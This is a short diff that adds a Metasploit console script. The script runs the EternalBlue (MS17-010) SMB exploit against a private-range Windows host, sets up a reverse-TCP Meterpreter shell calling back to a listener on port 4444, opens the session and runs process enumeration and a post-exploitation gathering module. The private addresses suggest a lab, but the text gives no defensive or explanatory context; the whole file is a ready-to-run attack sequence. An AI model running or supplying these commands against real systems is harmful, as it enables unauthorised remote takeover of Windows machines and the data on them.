@@ -1,0 +1,11 @@
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.2.15
+set LPORT 4444
+exploit
+sessions
+sessions -i 1
+ps
+run post/windows/gather/enum_pids
